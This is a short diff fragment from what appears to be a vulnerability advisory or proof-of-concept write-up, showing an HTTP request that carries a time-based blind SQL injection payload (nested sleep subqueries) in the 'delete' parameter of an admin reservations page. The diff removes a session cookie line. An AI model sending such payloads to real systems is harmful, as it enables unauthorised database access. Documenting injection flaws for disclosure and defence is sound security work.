@@ -18,7 +18,6 @@
 ```http
 GET /ht/admin/reservations.php?delete=(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'*/ HTTP/1.1
 Host: TARGET
-Cookie: PHPSESSID=<session>
 ```
 
 **Time-based Confirmation:**
